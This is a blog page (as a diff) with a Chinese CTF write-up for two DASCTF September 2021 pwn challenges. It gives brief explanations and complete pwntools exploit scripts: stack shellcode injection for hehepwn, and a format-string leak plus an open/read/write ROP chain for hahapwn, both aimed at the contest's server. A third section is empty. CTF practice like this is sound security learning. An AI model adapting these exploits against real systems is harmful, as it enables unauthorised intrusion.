@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="BUU月赛"/><meta name="keywords" content="pwn, " /><link rel="alternate" href="/atom.xml" title="null" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://brooke-hub.github.io/2021/09/26/BUU月赛/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>BUU月赛 - </title>
+  <meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo"></a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo"></a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">BUU月赛
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-09-26
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B"><span class="toc-text">DASCTF Sept X 浙江工业大学秋季挑战赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hehepwn"><span class="toc-text">hehepwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hahapwn"><span class="toc-text">hahapwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#datasystem"><span class="toc-text">datasystem</span></a></li></ol></li></ol>
+    </div>
+  </div><div class="post-content"><blockquote>
+<p>争取以后每个月赛都参加！</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="DASCTF-Sept-X-浙江工业大学秋季挑战赛"><a href="#DASCTF-Sept-X-浙江工业大学秋季挑战赛" class="headerlink" title="DASCTF Sept X 浙江工业大学秋季挑战赛"></a>DASCTF Sept X 浙江工业大学秋季挑战赛</h1><p><img src="/2021/09/26/BUU%E6%9C%88%E8%B5%9B/image-20210926103720313.png" alt="image-20210926103720313"></p>
+<h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p>栈溢出payload会被’\x00’截断，那就只覆盖个返回地址</p>
+<p>泄露栈地址，然后栈溢出跳到栈上的shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28964</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&quot;./bypwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/wendy/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bypwn&#x27;</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sla(<span class="string">&#x27;input:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;stack_addr&#x27;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">pay=shellcode.ljust(<span class="number">0x58</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">pay+=p64(stack_addr-<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;EASY PWN PWN PWN~&#x27;</span>,pay)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29107</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/wendy/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">pay=<span class="string">&#x27;%25$p.%27$p.%28$p&#x27;</span></span><br><span class="line">pay=pay.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">pay+=<span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">sla(<span class="string">&#x27;What is your name?&#x27;</span>,pay)</span><br><span class="line"><span class="comment"># 0x6ffc4</span></span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x6ffc4</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc.address=libc_base</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"><span class="comment"># 0xe0</span></span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">flag=stack_addr -<span class="number">0xe0</span></span><br><span class="line">leak(<span class="string">&#x27;flag&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400943</span></span><br><span class="line">pop_rsi=<span class="number">0x00000000000202f8</span>+libc_base</span><br><span class="line">pop_rdx=<span class="number">0x0000000000001b92</span>+libc_base</span><br><span class="line"></span><br><span class="line">orw_rop=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">orw_rop+=p64(pop_rdi)+p64(flag)</span><br><span class="line">orw_rop+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw_rop+=p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">orw_rop+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw_rop+=p64(pop_rsi)+p64(flag)</span><br><span class="line">orw_rop+=p64(pop_rdx)+p64(<span class="number">0x50</span>)</span><br><span class="line">orw_rop+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw_rop+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw_rop+=p64(pop_rsi)+p64(flag)</span><br><span class="line">orw_rop+=p64(pop_rdx)+p64(<span class="number">0x50</span>)</span><br><span class="line">orw_rop+=p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;What can we help you?&#x27;</span>,orw_rop)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2>
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="https://brooke-hub.github.io">WendyJellyBeans</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="https://brooke-hub.github.io/2021/09/26/BUU%E6%9C%88%E8%B5%9B/">https://brooke-hub.github.io/2021/09/26/BUU%E6%9C%88%E8%B5%9B/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/pwn/">pwn</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2021/09/26/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">近期比赛复现</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/2021/09/23/BSides-Noida-CTF-master-2021-pwn-%E5%A4%8D%E7%8E%B0/">
+        <span class="next-text nav-default">BSides-Noida-CTF-master_2021_pwn_复现</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">WendyJellyBeans</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
